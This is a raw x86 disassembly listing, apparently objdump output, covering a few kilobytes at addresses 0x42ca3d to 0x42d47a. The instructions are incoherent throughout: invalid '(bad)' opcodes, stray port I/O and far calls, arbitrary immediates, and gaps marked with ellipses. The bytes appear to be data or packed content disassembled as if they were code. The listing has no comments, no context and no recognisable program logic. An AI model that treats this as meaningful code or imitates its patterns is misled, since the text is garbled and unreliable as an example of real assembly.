  42ca3d:	adc    edx,DWORD PTR ds:0x7b5dc84e
  42ca43:	out    dx,al
  42ca44:	adc    bl,BYTE PTR gs:[ecx+0x762e02a9]
  42ca4b:	lea    ebx,[ecx+0x5e535dcd]
  42ca51:	rcl    DWORD PTR [ebp-0x6f4297c5],1
  42ca57:	sbb    DWORD PTR [ebp+0x1f],0x20
  42ca5b:	fwait
  42ca5c:	rcr    BYTE PTR [ebx],1
  42ca5e:	and    al,0x7
  42ca60:	imul   ebp,DWORD PTR [ecx+0x7c],0x75465fe6
  42ca67:	mov    WORD PTR [esi],?
  42ca69:	inc    ebx
  42ca6a:	xor    DWORD PTR [edx],ecx
  42ca6c:	dec    ebp
  42ca6d:	xchg   edi,eax
  42ca6e:	aad    0x21
  42ca70:	nop
  42ca71:	rcr    DWORD PTR [ecx-0x4],0xb0
  42ca75:	push   es
  42ca76:	retf   
  42ca77:	push   es
  42ca78:	pushf  
  42ca79:	daa    
  42ca7a:	(bad)  
  42ca7b:	or     eax,DWORD PTR [ebp+esi*2+0x1c54489]
  42ca82:	and    al,0x90
  42ca84:	in     eax,0x67
  42ca86:	(bad)  
  42ca87:	jae    0x42ca8e
  42ca89:	cs mov edx,0x9b6ecb53
  42ca8f:	cs pusha 
  42ca91:	outs   dx,BYTE PTR ds:[esi]
  42ca92:	fsubr  QWORD PTR [esi-0x73]
  42ca95:	dec    ebp
  42ca96:	push   eax
  42ca97:	sti    
  42ca98:	sub    BYTE PTR [edi],bh
  42ca9a:	iret   
  42ca9b:	xchg   esi,eax
  42ca9c:	mov    ch,0x1c
  42ca9e:	dec    ecx
  42ca9f:	jp     0x42cade
  42caa1:	and    eax,0xd36fdde9
  42caa6:	xchg   ebx,eax
  42caa7:	fisub  WORD PTR [eax+0x3cc4ead0]
  42caad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42caae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caaf:	push   esp
  42cab0:	in     eax,dx
  42cab1:	pop    es
  42cab2:	inc    edx
  42cab3:	adc    BYTE PTR [edx+0x10e959e1],ah
  42cab9:	xor    BYTE PTR [eax+esi*1],dl
  42cabc:	push   ecx
  42cabd:	and    DWORD PTR [ebp-0x6e007c36],esp
  42cac3:	jecxz  0x42caa8
  42cac5:	and    al,0xe4
  42cac7:	xor    bl,bl
  42cac9:	sti    
  42caca:	int3   
  42cacb:	outs   dx,BYTE PTR ds:[esi]
  42cacc:	mov    edx,0x50c47a6c
  42cad1:	pop    ebp
  42cad2:	fild   WORD PTR [edi-0x75]
  42cad5:	data16 jo 0x42cac5
  42cad8:	adc    BYTE PTR [esi+0xefe214c],cl
  42cade:	mov    al,BYTE PTR [esi*2+0x7c5611f7]
  42cae5:	shl    bl,0x88
  42cae8:	std    
  42cae9:	xor    bl,ch
  42caeb:	push   es
  42caec:	add    BYTE PTR es:[eax],al
	...
  42cb53:	add    BYTE PTR [eax],al
  42cb55:	add    BYTE PTR [edi-0x2be7726],ah
  42cb5b:	push   ebx
  42cb5c:	out    dx,eax
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x60326ec0]
  42cb64:	in     al,0x64
  42cb66:	pop    edi
  42cb67:	fiadd  WORD PTR [ecx]
  42cb69:	add    bh,bh
  42cb6b:	add    BYTE PTR [eax],al
  42cb6d:	add    BYTE PTR [edi],dl
  42cb6f:	and    DWORD PTR [edx-0x41],ebx
  42cb72:	imul   esp,DWORD PTR [ebp-0x4f592ba7],0x54
  42cb79:	add    ah,ah
  42cb7b:	fiadd  DWORD PTR [edx]
  42cb7d:	clc    
  42cb7e:	cmp    eax,0x805db113
  42cb83:	mov    ebx,0xdb5e6c92
  42cb88:	ss stc 
  42cb8a:	inc    esi
  42cb8b:	push   0xc99b5732
  42cb90:	pushf  
  42cb91:	lea    eax,[esi+eiz*8+0x23e61396]
  42cb98:	push   esp
  42cb99:	gs ret 0xd5ca
  42cb9d:	add    bl,BYTE PTR cs:[edx+0x219873ba]
  42cba4:	mov    ds:0xe569c931,eax
  42cba9:	out    dx,eax
  42cbaa:	lds    bx,DWORD PTR [edi]
  42cbad:	mov    ebx,0x4f0971a
  42cbb2:	adc    DWORD PTR [ebp+ecx*4+0x2855dbb9],0xba032c54
  42cbbd:	(bad)  
  42cbbf:	push   esp
  42cbc0:	int    0x1a
  42cbc2:	mul    ah
  42cbc4:	into   
  42cbc5:	push   eax
  42cbc6:	mov    ds:0x2613479,al
  42cbcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cbcc:	adc    cl,BYTE PTR [esi-0x48]
  42cbcf:	dec    esp
  42cbd0:	pop    ebp
  42cbd1:	aad    0x47
  42cbd3:	mov    edi,0x707cc76e
  42cbd8:	dec    esp
  42cbd9:	das    
  42cbda:	jo     0x42cc10
  42cbdc:	jo     0x42cbdc
  42cbde:	mov    ecx,DWORD PTR [ebp-0x71]
  42cbe1:	fnstsw WORD PTR [ebx+0x48]
  42cbe4:	jns    0x42cc3f
  42cbe6:	dec    edi
  42cbe7:	ja     0x42cba3
  42cbe9:	lahf   
  42cbea:	cld    
  42cbeb:	fsub   QWORD PTR [eax-0xe]
  42cbee:	sub    DWORD PTR [ecx-0x4f],esp
  42cbf1:	clc    
  42cbf2:	(bad)  
  42cbf3:	jg     0x42cb82
  42cbf5:	punpcklbw mm7,DWORD PTR [eax-0x49]
  42cbf9:	aad    0x2e
  42cbfb:	push   0x5c
  42cbfd:	dec    esi
  42cbfe:	mov    ah,0xc9
  42cc00:	test   BYTE PTR [edi-0x52],bh
  42cc03:	pushf  
  42cc04:	in     al,dx
  42cc05:	pop    ebp
  42cc06:	cmc    
  42cc07:	and    DWORD PTR [eax],eax
  42cc09:	(bad)  
  42cc0b:	ret    0x9327
  42cc0e:	mov    DWORD PTR [ecx+0x55d649b2],0x5984d9a1
  42cc18:	inc    esp
  42cc19:	int    0x9c
  42cc1b:	jmp    0x42cc43
  42cc1d:	push   0x628cce53
  42cc22:	aas    
  42cc23:	inc    ebx
  42cc24:	fisubr DWORD PTR [ecx]
  42cc26:	cmp    dl,BYTE PTR [edi+edx*4]
  42cc29:	int3   
  42cc2a:	shl    BYTE PTR [ebp-0x6fbfbb91],1
  42cc30:	cmp    al,0xa9
  42cc32:	test   eax,0x78d1632a
  42cc37:	inc    edx
  42cc38:	pop    edi
  42cc39:	aam    0xfb
  42cc3b:	mov    DWORD PTR [ecx],ecx
  42cc3d:	stos   DWORD PTR es:[edi],eax
  42cc3e:	xchg   esi,eax
  42cc3f:	and    BYTE PTR [eax],dh
  42cc41:	xchg   ecx,eax
  42cc42:	mov    edx,0x5fe1dcb3
  42cc47:	lds    ebx,FWORD PTR [eiz*8-0x48498f5a]
  42cc4e:	cmp    DWORD PTR [edi],ebp
  42cc50:	jle    0x42cbfb
  42cc52:	pop    edi
  42cc53:	and    DWORD PTR [ebx+0x75],ebp
  42cc56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc57:	add    eax,0x7600173d
  42cc5c:	pop    edi
  42cc5d:	jo     0x42ccb4
  42cc5f:	sbb    ecx,edi
  42cc61:	cdq    
  42cc62:	mul    DWORD PTR [eax]
  42cc64:	xor    ch,bl
  42cc66:	pop    esp
  42cc67:	xor    BYTE PTR [ebx+edi*8],ah
  42cc6a:	add    cl,BYTE PTR [eax+0xb8]
	...
  42ccd4:	add    BYTE PTR [eax],al
  42ccd6:	jg     0x42ccda
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x423712bd
  42cce6:	pop    esi
  42cce7:	fild   WORD PTR [ecx]
  42cce9:	add    bh,bh
  42cceb:	add    BYTE PTR [eax],al
  42cced:	add    BYTE PTR [eax-0x3a62ecb3],dh
  42ccf3:	push   esi
  42ccf4:	or     dh,BYTE PTR [edx+0x126ff16d]
  42ccfa:	jae    0x42cd4c
  42ccfc:	loop   0x42ccb9
  42ccfe:	aam    0xce
  42cd00:	jecxz  0x42cd72
  42cd02:	pop    edx
  42cd03:	test   BYTE PTR [esi],ah
  42cd05:	mov    bl,0x3f
  42cd07:	and    al,0x94
  42cd09:	cmp    eax,0x7bc58897
  42cd0e:	cmp    eax,0xae0e34be
  42cd13:	test   al,0x64
  42cd15:	mov    eax,0x9e35cd46
  42cd1a:	push   ecx
  42cd1b:	test   eax,0x91f7dd72
  42cd20:	jmp    0x42ccae
  42cd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd23:	xchg   edi,eax
  42cd24:	pop    ebx
  42cd25:	loop   0x42cd45
  42cd27:	test   eax,esi
  42cd29:	jmp    0xc3e:0x5be05ef6
  42cd30:	sbb    al,0x19
  42cd32:	arpl   WORD PTR [eax],di
  42cd34:	inc    edx
  42cd35:	mov    DWORD PTR [ecx+0x716338b3],edx
  42cd3b:	xchg   edi,eax
  42cd3c:	call   0xbb47:0xbeb3a761
  42cd43:	mov    edi,0x86f4d60d
  42cd48:	xchg   ecx,eax
  42cd49:	(bad)  [edi+esi*8]
  42cd4c:	(bad)  
  42cd4d:	es ins BYTE PTR es:[edi],dx
  42cd4f:	adc    al,BYTE PTR [ecx-0x181e8b4d]
  42cd55:	fwait
  42cd56:	and    cl,bl
  42cd58:	(bad)  
  42cd5a:	inc    ecx
  42cd5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd5c:	sub    bl,bh
  42cd5e:	mov    bl,0x40
  42cd60:	and    esp,esp
  42cd62:	scas   eax,DWORD PTR es:[edi]
  42cd63:	pop    edx
  42cd64:	mov    ebp,0x979c24b5
  42cd69:	icebp  
  42cd6a:	fcomp  QWORD PTR [esi]
  42cd6c:	cmp    al,BYTE PTR ds:0xd9394e4e
  42cd72:	test   BYTE PTR [ecx+0x14],0x2
  42cd76:	sbb    eax,0x537f9183
  42cd7b:	jb     0x42cd56
  42cd7d:	pop    esi
  42cd7e:	aas    
  42cd7f:	popf   
  42cd80:	sbb    esp,ebp
  42cd82:	jo     0x42cdb0
  42cd84:	mov    ?,WORD PTR [edi]
  42cd86:	aam    0x52
  42cd88:	sub    DWORD PTR [ebx],edx
  42cd8a:	lods   al,BYTE PTR ds:[esi]
  42cd8b:	push   eax
  42cd8c:	ret    0xb706
  42cd8f:	rcl    ebx,1
  42cd91:	das    
  42cd92:	jmp    0xe253b799
  42cd97:	dec    ebx
  42cd98:	sbb    BYTE PTR [ecx+0x33],dh
  42cd9b:	retf   0x3845
  42cd9e:	fisubr DWORD PTR [eax]
  42cda0:	mov    ebp,ecx
  42cda2:	in     al,0x46
  42cda4:	outs   dx,DWORD PTR ds:[esi]
  42cda5:	repz sbb bl,BYTE PTR [esi-0x58]
  42cda9:	jle    0x42ce14
  42cdab:	cmp    bl,bl
  42cdad:	outs   dx,DWORD PTR ds:[esi]
  42cdae:	add    bh,BYTE PTR [eax+edx*2+0x3e]
  42cdb2:	add    BYTE PTR [ecx-0x3bf96d66],bl
  42cdb8:	jecxz  0x42ce1c
  42cdba:	jp     0x42ce04
  42cdbc:	in     eax,0x2f
  42cdbe:	or     DWORD PTR [ecx+0x7d],edx
  42cdc1:	rol    BYTE PTR [edi+0x74c11b46],cl
  42cdc7:	mov    al,ds:0x542bfd78
  42cdcc:	add    BYTE PTR [ebp*4-0x275230c9],0x8f
  42cdd4:	pop    edi
  42cdd5:	push   0x283da4ac
  42cdda:	dec    edx
  42cddb:	pop    ebx
  42cddc:	lds    ecx,FWORD PTR [eax+0xe42a95]
  42cde2:	jo     0x42cdf6
  42cde4:	jno    0x42ce0a
  42cde6:	imul   ebp,DWORD PTR [eax+ebx*4],0xffffff8c
  42cdea:	dec    ebp
  42cdeb:	sub    al,0x52
	...
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0x4e
  42ce63:	pusha  
  42ce64:	mov    al,0x34
  42ce66:	pop    ebp
  42ce67:	loopne 0x42ce6a
  42ce69:	add    bh,bh
  42ce6b:	add    BYTE PTR [eax],al
  42ce6d:	add    BYTE PTR [eax-0x35],bh
  42ce70:	ins    BYTE PTR es:[edi],dx
  42ce71:	cdq    
  42ce72:	sbb    al,0x2d
  42ce74:	shl    DWORD PTR [ecx+0x3c3f7668],cl
  42ce7a:	pop    ecx
  42ce7b:	lahf   
  42ce7c:	inc    BYTE PTR [edi-0x46]
  42ce7f:	shl    ebx,cl
  42ce81:	ret    
  42ce82:	add    dh,BYTE PTR [ebx]
  42ce84:	aaa    
  42ce85:	mov    esi,0xf25d0bf5
  42ce8a:	gs pop ebp
  42ce8c:	(bad)  
  42ce8d:	pop    ebp
  42ce8e:	fmul   QWORD PTR [esi+0x747ccdaf]
  42ce94:	pop    ebx
  42ce95:	adc    esp,DWORD PTR [eax+0x6bfd6a23]
  42ce9b:	ss dec edx
  42ce9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce9e:	gs xchg edi,eax
  42cea0:	ja     0x42ce23
  42cea2:	sbb    al,0xf1
  42cea4:	mov    dh,bh
  42cea6:	iret   
  42cea7:	retf   
  42cea8:	pop    ebp
  42cea9:	mov    ds:0xfec20ebf,eax
  42ceae:	outs   dx,BYTE PTR ds:[esi]
  42ceaf:	or     eax,0x2273a4e0
  42ceb4:	repz icebp 
  42ceb6:	ja     0x42ceda
  42ceb8:	jmp    0xa572:0x2aa8ed87
  42cebf:	outs   dx,DWORD PTR ds:[esi]
  42cec0:	retf   
  42cec1:	aam    0xcd
  42cec3:	lahf   
  42cec4:	push   0xdfb6bee9
  42cec9:	fidiv  DWORD PTR [ebx]
  42cecb:	sbb    edi,DWORD PTR [edx]
  42cecd:	push   ds
  42cece:	xchg   DWORD PTR [ebx-0x1c781f4a],edx
  42ced4:	popa   
  42ced5:	pop    ecx
  42ced6:	mov    esp,0xadc6adcb
  42cedb:	ins    BYTE PTR es:[edi],dx
  42cedc:	cmp    BYTE PTR [esi+0x23fd1ea4],dh
  42cee2:	lds    ecx,FWORD PTR [ecx-0x1d]
  42cee5:	lods   al,BYTE PTR ds:[esi]
  42cee6:	scas   eax,DWORD PTR es:[edi]
  42cee7:	cmp    al,0x85
  42cee9:	mov    ch,0x19
  42ceeb:	stos   BYTE PTR es:[edi],al
  42ceec:	jp     0x42ce77
  42ceee:	sbb    eax,0xed31029
  42cef3:	mov    DWORD PTR [eax],esi
  42cef5:	fwait
  42cef6:	inc    ebp
  42cef7:	push   ds
  42cef8:	jp     0x42ceda
  42cefa:	in     al,0x91
  42cefc:	mov    dh,0xf9
  42cefe:	or     eax,0x8989f98c
  42cf03:	jae    0x42cf14
  42cf05:	pop    ss
  42cf06:	(bad)  
  42cf07:	mov    ecx,0x4d389932
  42cf0c:	push   ebx
  42cf0d:	mov    ebx,0xa249eca4
  42cf12:	popf   
  42cf13:	shr    BYTE PTR [esi-0x17674f85],0x2
  42cf1a:	call   0x4699:0xc7446c64
  42cf21:	jl     0x42cec6
  42cf23:	jl     0x42ceda
  42cf25:	mov    ch,0x9
  42cf27:	test   al,0x34
  42cf29:	js     0x42cf7d
  42cf2b:	call   0x3e4d:0x827419ca
  42cf32:	push   esp
  42cf33:	pop    ecx
  42cf34:	inc    esi
  42cf35:	mov    ecx,0xb306d5ae
  42cf3a:	push   edx
  42cf3b:	add    eax,0xcd5de574
  42cf40:	dec    edx
  42cf41:	push   0x6b
  42cf43:	and    al,0x75
  42cf45:	loopne 0x42cf77
  42cf47:	xchg   ah,dh
  42cf49:	sub    eax,0x710afb32
  42cf4e:	cmp    cl,BYTE PTR [ebx+ebp*8-0x4f]
  42cf52:	pop    esi
  42cf53:	test   BYTE PTR [edi+0x25a47cf3],al
  42cf59:	add    DWORD PTR [eax-0x60cbf16d],0x28
  42cf60:	mov    BYTE PTR ds:0x6cc57787,al
  42cf66:	and    al,0x71
  42cf68:	add    ecx,eax
  42cf6a:	and    BYTE PTR [eax],dl
  42cf6c:	js     0x42cf6e
	...
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    edx,FWORD PTR [eax]
  42cfe3:	or     ch,BYTE PTR [edi+0x2f]
  42cfe6:	pop    esp
  42cfe7:	loope  0x42cfea
  42cfe9:	add    bh,bh
  42cfeb:	add    BYTE PTR [eax],al
  42cfed:	add    BYTE PTR [edi],ch
  42cfef:	mov    ebp,0x87ae02a7
  42cff4:	push   0xffffff91
  42cff6:	fdivr  QWORD PTR [ecx-0x75]
  42cff9:	xor    ecx,DWORD PTR [ebp-0x310494e6]
  42cfff:	xchg   ebp,eax
  42d000:	dec    esp
  42d001:	cmp    BYTE PTR [ebp+0x735d41d4],dh
  42d007:	mov    cl,0xee
  42d009:	mov    ch,0x9d
  42d00b:	ret    0xf1a0
  42d00e:	inc    ebx
  42d00f:	mov    al,ds:0x5fc644c2
  42d014:	cmovbe esp,DWORD PTR [ecx+0x28df1b36]
  42d01b:	fwait
  42d01c:	jns    0x42cfd2
  42d01e:	add    ch,BYTE PTR [ecx+esi*2]
  42d021:	shl    DWORD PTR [ebp-0x22],1
  42d024:	std    
  42d025:	or     DWORD PTR [esp+ecx*8-0x34],0xffffffc5
  42d02a:	jp     0x42cfd1
  42d02c:	stos   BYTE PTR es:[edi],al
  42d02d:	retf   0xa1ae
  42d030:	add    DWORD PTR [ecx+0x3c4bbecb],ebp
  42d036:	in     eax,0xe6
  42d038:	(bad)  
  42d039:	jle    0x42d08a
  42d03b:	mov    DWORD PTR [ecx],eax
  42d03d:	int    0xa1
  42d03f:	mov    eax,esi
  42d041:	pop    ebp
  42d042:	ds push eax
  42d044:	enter  0xe10,0xa1
  42d048:	das    
  42d049:	loope  0x42d001
  42d04b:	lock daa 
  42d04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d04e:	xor    ebx,ebx
  42d050:	pop    eax
  42d051:	xchg   ecx,eax
  42d052:	add    eax,0xafc24daf
  42d057:	or     edx,0x9dde3709
  42d05d:	xchg   BYTE PTR [ebp-0x6f],bh
  42d060:	sub    BYTE PTR [eax+eiz*1-0x22f3785f],bl
  42d067:	mov    ecx,0xe285cc8
  42d06c:	pop    edi
  42d06d:	arpl   WORD PTR [ebx+ecx*2],bx
  42d070:	and    eax,0xc3923811
  42d075:	jno    0x42d0ee
  42d077:	dec    esp
  42d079:	repz add eax,0x9f10fd55
  42d07f:	clc    
  42d080:	mov    dl,0x9
  42d082:	push   esp
  42d083:	test   eax,0x8a7e4827
  42d088:	mov    ds:0x487dc26f,al
  42d08d:	aaa    
  42d08e:	jmp    0x5f06:0xb355b1fe
  42d095:	push   0x21
  42d097:	mov    eax,0xb036fc05
  42d09c:	aas    
  42d09d:	sub    DWORD PTR [edx],edx
  42d09f:	mul    BYTE PTR [esi+0x1ef6c79]
  42d0a5:	push   ebp
  42d0a6:	lock and ebx,DWORD PTR [ecx-0x40]
  42d0aa:	imul   esi,DWORD PTR [esi-0x14],0x5c642e8
  42d0b1:	xchg   ebx,eax
  42d0b2:	mov    edx,0x13fc39fe
  42d0b7:	cld    
  42d0b8:	je     0x42d0cc
  42d0ba:	jmp    FWORD PTR [edi+0x53c080ed]
  42d0c0:	fdiv   DWORD PTR [ecx+edx*8+0x28]
  42d0c4:	and    ebp,eax
  42d0c6:	(bad)  [esi+0x3306a32b]
  42d0cc:	sub    BYTE PTR [edx+0x3dd35912],bl
  42d0d2:	push   ecx
  42d0d3:	add    bl,bl
  42d0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d0d6:	fldenv [ecx+0x2fdaac30]
  42d0dc:	das    
  42d0dd:	pop    es
  42d0de:	pop    edi
  42d0df:	lds    esp,FWORD PTR cs:[edx]
  42d0e2:	fsubrp st(2),st
  42d0e4:	jge    0x42d0fa
  42d0e6:	push   es
  42d0e7:	or     DWORD PTR [edx+edx*4+0x18a540],ebx
	...
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    bh,dh
  42d163:	jo     0x42d149
  42d165:	mov    WORD PTR [ebx-0x1e],ds
  42d168:	add    DWORD PTR [eax],eax
  42d16a:	inc    DWORD PTR [eax]
  42d16c:	add    BYTE PTR [eax],al
  42d16e:	adc    BYTE PTR [eax+0x49eb8f83],bl
  42d174:	daa    
  42d175:	or     bl,dl
  42d177:	dec    edx
  42d178:	sbb    eax,DWORD PTR [ebx]
  42d17a:	rcr    BYTE PTR [esp+ecx*4],cl
  42d17d:	mov    ds:0x972b6bb6,al
  42d182:	ins    DWORD PTR es:[edi],dx
  42d183:	ja     0x42d1a6
  42d185:	ss adc esp,edi
  42d188:	xchg   ebx,eax
  42d189:	arpl   WORD PTR [esi+0x4af41579],bx
  42d18f:	das    
  42d190:	dec    eax
  42d191:	fwait
  42d192:	dec    esi
  42d193:	(bad)  
  42d194:	loopne 0x42d1ed
  42d196:	cwde   
  42d197:	rcr    dh,1
  42d199:	jb     0x42d176
  42d19b:	leave  
  42d19c:	add    DWORD PTR [ebp-0x350bd450],0xc5325ae9
  42d1a6:	xor    al,0x2
  42d1a8:	adc    bl,dl
  42d1aa:	lods   al,BYTE PTR ds:[esi]
  42d1ab:	lea    ebx,[ebp-0x6d63be36]
  42d1b1:	dec    edi
  42d1b2:	idiv   BYTE PTR [eax-0xa]
  42d1b5:	mov    edi,0x693a6ec6
  42d1ba:	mov    cl,0x2b
  42d1bc:	and    dl,BYTE PTR [ebp+0x59]
  42d1bf:	push   ebx
  42d1c0:	xchg   esp,eax
  42d1c1:	or     cl,bh
  42d1c3:	scas   al,BYTE PTR es:[edi]
  42d1c4:	pop    eax
  42d1c5:	push   cs
  42d1c6:	and    ebp,ecx
  42d1c8:	imul   eax,DWORD PTR [esi+edi*8+0xef17e23],0xffffff99
  42d1d0:	mov    ds:0x5bfe7f44,al
  42d1d5:	mov    ds:0x6f9938e0,al
  42d1da:	adc    al,0x3b
  42d1dc:	sbb    DWORD PTR [esi+0xb],esi
  42d1df:	cmp    bl,ch
  42d1e1:	push   eax
  42d1e2:	imul   esp,esp,0xffffffaf
  42d1e5:	lahf   
  42d1e6:	lods   al,BYTE PTR ds:[esi]
  42d1e7:	int    0xde
  42d1e9:	jno    0x42d207
  42d1eb:	mov    BYTE PTR [edi],bh
  42d1ed:	inc    esi
  42d1ee:	stos   BYTE PTR es:[edi],al
  42d1ef:	xchg   ebx,eax
  42d1f0:	xchg   edi,eax
  42d1f1:	jp     0x42d203
  42d1f3:	rcr    DWORD PTR [edi-0x71],cl
  42d1f6:	mov    ch,0x4f
  42d1f8:	cmp    eax,0xf2dfebe4
  42d1fd:	sbb    al,0x75
  42d1ff:	cmp    bh,bl
  42d201:	pusha  
  42d202:	scas   eax,DWORD PTR es:[edi]
  42d203:	and    BYTE PTR [esi-0x7f],dl
  42d206:	or     DWORD PTR ds:0xb301733b,edi
  42d20c:	sar    BYTE PTR [esi+0x41],1
  42d20f:	call   0xcf3e452d
  42d214:	ret    
  42d215:	out    dx,al
  42d216:	imul   esi
  42d218:	mov    esp,0xe532b304
  42d21d:	cmp    BYTE PTR es:[esi-0x6],bh
  42d221:	xor    bh,BYTE PTR [edx]
  42d223:	call   0x48a1:0xe4106ba9
  42d22a:	clc    
  42d22b:	inc    esp
  42d22c:	push   edx
  42d22d:	les    ecx,FWORD PTR [ebx+0x7bdbbf5d]
  42d233:	cmp    DWORD PTR [edx+0xc5b29f6],esp
  42d239:	sbb    eax,0x5add4b8
  42d23e:	jl     0x42d254
  42d240:	test   bh,bh
  42d242:	mov    ?,WORD PTR [ebp+0x34a018f]
  42d248:	xor    al,BYTE PTR [ecx+0x72d6f87f]
  42d24e:	jge    0x42d2a6
  42d250:	les    ebx,FWORD PTR [ebx+edx*2]
  42d253:	ja     0x42d2a4
  42d255:	(bad)  
  42d256:	es push es
  42d258:	jp     0x42d1f3
  42d25a:	fild   QWORD PTR [ebx+ecx*8-0x29156c62]
  42d261:	lock mov bh,BYTE PTR [ebp-0x77]
  42d265:	fcomp  QWORD PTR [ebx]
  42d267:	and    BYTE PTR [eax-0x68b91a6f],ch
	...
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d334
  42d2e3:	xor    bh,dh
  42d2e5:	fs pop edx
  42d2e7:	jecxz  0x42d2ea
  42d2e9:	add    bh,bh
  42d2eb:	add    BYTE PTR [eax],al
  42d2ed:	add    BYTE PTR [edi-0x52],cl
  42d2f0:	push   0x462d9201
  42d2f5:	call   0xd783:0xa80f6871
  42d2fc:	xchg   DWORD PTR [edi],eax
  42d2fe:	(bad)  
  42d2ff:	das    
  42d300:	cmp    DWORD PTR [eax],esp
  42d302:	add    ah,BYTE PTR [eax+0x19950e05]
  42d308:	or     cl,BYTE PTR [ebx-0x7a5c45af]
  42d30e:	and    BYTE PTR [esi+edi*4+0x51],dh
  42d312:	inc    esp
  42d313:	pop    ds
  42d314:	and    DWORD PTR [eax],0x82161cba
  42d31a:	sub    al,0xad
  42d31c:	add    BYTE PTR [edi],dl
  42d31e:	mov    ds,WORD PTR [eax+edx*8-0x73d1f221]
  42d325:	mov    ebp,DWORD PTR es:[eax-0x5d3df92b]
  42d32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d32d:	add    al,0x8f
  42d32f:	je     0x42d361
  42d331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d332:	pop    es
  42d333:	pop    esi
  42d334:	sbb    BYTE PTR [ecx-0x744f79ab],dl
  42d33a:	enter  0xdef9,0xa1
  42d33e:	out    0x42,eax
  42d340:	push   esi
  42d341:	fst    DWORD PTR [eax+edx*4]
  42d344:	lock adc BYTE PTR [esi-0x570183c8],bl
  42d34b:	jno    0x42d357
  42d34d:	popf   
  42d34e:	in     al,0x2f
  42d350:	mov    al,ds:0x98767692
  42d355:	xchg   edx,eax
  42d356:	mov    ch,0x7b
  42d358:	add    BYTE PTR [edi+esi*2],bl
  42d35b:	fisttp WORD PTR [edi+edi*4+0x5bb8eaf5]
  42d362:	xor    dh,BYTE PTR [esi+ebx*1]
  42d365:	out    dx,al
  42d366:	xchg   ecx,eax
  42d367:	sub    eax,0x453b58ff
  42d36c:	cwde   
  42d36d:	into   
  42d36e:	or     DWORD PTR [eax+edx*2+0x3e],edx
  42d372:	mov    bl,0x2e
  42d374:	pop    eax
  42d375:	xchg   ecx,eax
  42d376:	xchg   edi,eax
  42d377:	push   ds
  42d378:	in     al,dx
  42d379:	leave  
  42d37a:	xor    ebp,eax
  42d37c:	test   al,0x18
  42d37e:	inc    esi
  42d37f:	and    cl,bl
  42d381:	pop    esp
  42d382:	inc    esi
  42d383:	les    edi,FWORD PTR [ebx+0x64]
  42d386:	pop    eax
  42d387:	(bad)  
  42d388:	pop    ds
  42d389:	repnz cmp DWORD PTR [eax-0x5a5de4eb],eax
  42d390:	das    
  42d391:	dec    eax
  42d392:	sub    ebp,0x62
  42d395:	jg     0x42d3f9
  42d397:	mov    al,0xf9
  42d399:	adc    BYTE PTR [ebx-0x46c8decc],cl
  42d39f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d3a0:	pop    esi
  42d3a1:	in     al,0xc5
  42d3a3:	dec    esi
  42d3a4:	nop
  42d3a5:	and    ah,ch
  42d3a7:	jbe    0x42d392
  42d3a9:	loop   0x42d358
  42d3ab:	jae    0x42d419
  42d3ad:	out    dx,al
  42d3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3af:	xchg   ecx,eax
  42d3b0:	cmp    al,0xaa
  42d3b2:	cmp    al,bh
  42d3b4:	inc    esp
  42d3b5:	adc    edi,DWORD PTR [ecx-0x41]
  42d3b8:	xchg   edx,eax
  42d3b9:	mov    al,ds:0xb197f045
  42d3be:	pop    esp
  42d3bf:	mov    esp,0xaeb4eba0
  42d3c4:	mov    eax,ds:0x32a9626c
  42d3c9:	retf   0xd579
  42d3cc:	dec    ebx
  42d3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3ce:	enter  0xc528,0x7d
  42d3d2:	xchg   ebp,eax
  42d3d3:	imul   edx,DWORD PTR [eax+ebx*4-0x78],0x570b5033
  42d3db:	ins    DWORD PTR es:[edi],dx
  42d3dc:	aaa    
  42d3dd:	pushf  
  42d3de:	dec    edi
  42d3df:	jnp    0x42d45e
  42d3e1:	cdq    
  42d3e2:	je     0x42d38c
  42d3e4:	pop    esp
  42d3e5:	push   edx
  42d3e6:	adc    edx,edx
  42d3e8:	test   eax,0x4e1ada40
	...
  42d455:	add    cl,al
  42d457:	into   
  42d458:	arpl   WORD PTR [ecx-0x21044291],bx
  42d45e:	pop    ecx
  42d45f:	xchg   esp,eax
  42d460:	aaa    
  42d461:	pushf  
  42d462:	out    0x9d,eax
  42d464:	fisttp DWORD PTR [eax+0x1e459]
  42d46a:	inc    DWORD PTR [eax]
  42d46c:	add    BYTE PTR [eax],al
  42d46e:	test   bh,al
  42d470:	push   ecx
  42d471:	shl    DWORD PTR [esi],1
  42d473:	mov    ds:0xc77f1133,al
  42d478:	sbb    dl,al
  42d47a:	retf   0x3ba8
